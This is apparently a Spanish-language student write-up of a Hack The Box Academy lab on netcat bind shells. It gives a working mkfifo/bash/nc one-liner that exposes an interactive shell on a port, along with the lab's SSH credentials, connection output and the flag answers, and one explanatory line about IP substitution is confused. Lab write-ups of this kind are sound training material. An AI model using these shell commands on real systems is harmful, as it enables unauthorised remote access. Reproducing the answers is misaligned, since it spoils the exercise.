Un _bind shell_ permite al pentester conectarse a un sistema objetivo a través de su shell. En este caso, el sistema **victima** inicia un _listener_ que espera conexiones entrantes.

1. El objetivo (target) inicia un listener en un puerto específico usando Netcat (nc).
```
nc -lvnp 7777
```

2. El atacante (cliente) se conecta al IP y puerto del objetivo:
```
nc -nv <IP_objetivo> 7777
````
3. Al conectarse, se establece un canal de comunicación (TCP), pero inicialmente solo permite enviar y recibir texto.

### Consideraciones

- Debe haber un listener activo en el objetivo.
- Los firewalls de red u OS pueden bloquear conexiones entrantes.
- NAT y PAT en redes públicas dificultan la conexión desde fuera.
- Más fácil de detectar que un _reverse shell_ por tráfico entrante.

### Estableciendo un bind shell real con Netcat

Para obtener control real del sistema y no solo enviar texto:

En la máquina víctima, se debería ejecutar:

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP_víctima> 7777 > /tmp/f
```

Este comando conecta la shell del servidor con Netcat, creando un canal bidireccional para que el atacante pueda enviar comandos y recibir respuestas.
En este comando, la **máquina víctima** tiene que reemplazar `<IP_objetivo>` por la **IP de la máquina atacante**, no la suya.

Máquina atacante ejecuta:
```
nc -nv <IP_víctima> 7777
```
Este comando se utiliza para conectarse al servidor y enviar comandos a la shell.

----
***QUESTIONS***
Target(s): 10.129.201.134 (ACADEMY-SHELLS-WEBSHELLS)
SSH to 10.129.201.134 (ACADEMY-SHELLS-WEBSHELLS) with user "htb-student" and password "HTB_@cademy_stdnt!" 

**1. Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?**
Respuesta: *443*

**2. SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

Ejecuto desde la máquina atacante un:
```
ssh htb-student@10.129.201.134
```

Ingreso la contraseña *HTB_@cademy_stdnt!*
Con un *whoami* me aseguro que sea *htb-student*.

La máquina ataca

Pongo a la máquina víctima en escucha por el puerto 8080, con el comando:
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP_víctima> <puerto_víctima> > /tmp/f
```

Siendo el comando final:
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 8080 > /tmp/f
```

El atacante, debe ejecutar:
```
sudo nc -nv <ip_vicitma> <puerto_víctima>

```

Se establece la conexión exitosamente:
```
┌─[eu-academy-3]─[10.10.14.95]─[htb-ac-1876550@htb-arqddjqiag]─[~]
└──╼ [★]$ sudo nc -nv 10.129.201.134 8080
(UNKNOWN) [10.129.201.134] 8080 (http-alt) open
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:~$    <-- listo para escribir comandos

```

Y realizo un *cat /customscripts/flag.txt*, viendo como salida: 
```
htb-student@ubuntu:~$ cat /customscripts/flag.txt
cat /customscripts/flag.txt
B1nD_Shells_r_cool
```
Respuesta: *B1nD_Shells_r_cool*
